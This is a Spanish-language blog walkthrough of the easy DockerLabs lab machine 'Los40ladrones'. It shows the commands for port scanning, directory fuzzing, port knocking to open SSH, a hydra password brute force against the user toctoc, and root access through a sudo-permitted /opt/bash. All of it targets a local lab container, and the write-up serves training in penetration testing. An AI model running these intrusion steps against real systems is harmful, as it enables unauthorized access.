---
layout: post
title: "Los40ladrones"
date: 2024-08-17 13:55:23
category: dockerlabs
vm: dockerlabsfacil
---

<table class="log">
  <tr>
    <td rowspan="5"><img src="/notas/public/img/dockerlabs/dockerlabs.png" width=260></td>
    <td></td>
  </tr>
  <tr> <td><strong>Máquina:</strong> Los40ladrones </td> </tr>
  <tr> <td><strong>SO:</strong> Linux</td> </tr>
  <tr> <td><strong>Nivel:</strong> <span class="easy">Facil</span></td> </tr>
  <tr> <td><strong><a href="https://dockerlabs.es" target="_blank"> DockerLabs</a></strong></td> </tr>
</table>

<br>


![img](/notas/public/img/dockerlabs/los40ladrones/host.png){:.margin}

**1\.** Escaneo los puertos abiertos de la maquina, solo tenemos el servicio apache.

`sudo nmap -p- -T5 --open --min-rate=5000 -sCV -n -Pn 172.17.0.2`

![img](/notas/public/img/dockerlabs/los40ladrones/nmap.png){:.margin}

**2\.** En la web tenemos la pagina por defecto de apache, no tenemos mas.

`http://172.17.0.2/`

![img](/notas/public/img/dockerlabs/los40ladrones/80.png){:.margin}

**3\.** Toca hacer un poco de fuzzing.

`gobuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovey/Web-Content/directory-list-2.3-medium.txt -x html,php,txt -q`

![img](/notas/public/img/dockerlabs/los40ladrones/gobuster.png){:.margin}

**4\.** Tenemos un posible usuario y ademas nos da una secuencia de numeros.

`http://172.17.0.2/qdefense.txt`

![img](/notas/public/img/dockerlabs/los40ladrones/qdefense.png){:.margin}

**5\.** Escaneo los 10 puertos mas comunes,puede ser que tengamos algun puerto filtrado y que sea de interes.

`sudo nmap --top-ports 10 -n -Pn 172.17.0.2`

![img](/notas/public/img/dockerlabs/los40ladrones/nmaptop.png){:.margin}

**6\.** Suponiendo que la secuencia de numeros que nos da son puertos, hacemos port knocking.

`apt install knockd`

`knock 172.17.0.2 7000 8000 9000 -v`

![img](/notas/public/img/dockerlabs/los40ladrones/knock.png){:.margin}

**7\.** Volvemos a escanear los puertos de la maquina, el port knocking nos activo el puerto 22.

`sudo nmap -p- -T5 --min-rate=5000 -sCV -n -Pn 172.17.0.2`

![img](/notas/public/img/dockerlabs/los40ladrones/nmap2.png){:.margin}

**8\.** Hago fuerza bruta por ssh a la contraseña del usuario toctoc.

`hydra -l toctoc -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2`

![img](/notas/public/img/dockerlabs/los40ladrones/hydra.png){:.margin}

**9\.** Nos conectamos por ssh.

`ssh toctoc@172.17.0.2`

![img](/notas/public/img/dockerlabs/los40ladrones/sshtoctoc.png){:.margin}

**10\.** Reviso los permisos sudo del usuario, tenemos dos binarios con todo los permisos y entre ellas la bash.

`sudo -l`

![img](/notas/public/img/dockerlabs/los40ladrones/sudol.png){:.margin}

**11\.** Obtenemos el superusuario.

`sudo /opt/bash`

![img](/notas/public/img/dockerlabs/los40ladrones/root.png){:.margin}

<br>

<a href="#">_Finalizado._</a>